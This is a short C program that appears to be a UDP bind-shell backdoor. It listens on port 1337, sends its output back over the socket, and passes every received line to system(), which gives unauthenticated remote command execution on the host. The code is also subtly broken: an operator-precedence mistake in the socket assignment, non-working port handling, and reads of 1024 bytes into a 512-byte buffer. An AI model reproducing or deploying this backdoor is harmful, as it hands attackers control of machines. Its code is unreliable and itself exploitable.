#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <ctype.h>
#include <unistd.h>

#define DP 1337 /* Default Port */

void usg(char ** argv) {
	printf("usage: %s [port]\n", * argv);
}

void error(const char *s) {
	perror(s);
	exit(-1);
}

int main(int argc, char ** argv) {
	struct sockaddr_in s = {};
	struct sockaddr u;
	char * p, b[512];

	if (argc == 2) {
		for (p = argv[1];* p;p++) {
			if (!isdigit( * p)) usg(argv);
		}
		argc = atoi(*(++argv));
	}

	s.sin_port = htons(argc == 2 ? argc : DP), s.sin_addr.s_addr = INADDR_ANY, s.sin_family = AF_INET;
	if (argc = socket(AF_INET,SOCK_DGRAM,0) < 0) error("socket");
	
	if (bind(argc, & s,sizeof(u)) < 0) error("bind");

	dup2(argc, 1);
	dup2(argc, 2);

	s.sin_port = sizeof(u);

	if (recvfrom(argc, & b, 1024, 0, & u, (int *) & (s.sin_port)) <= 0) error("recvfrom");

	if (connect(argc, & u, sizeof(u)) < 0) error("connect");
	
	do {
		for (*argv = b, p = 0; **argv && ((*argv - b) < 512 || (p = *argv)); ( *argv) ++) {
			if (p ||  **argv == '\r' || **argv == '\n') {
				**argv = 0;
				break;
			}
			if (p) continue;
		}	
		system(b);
		recv(argc, & b, 1024, 0);
	} while (1);
	exit(0);	
}
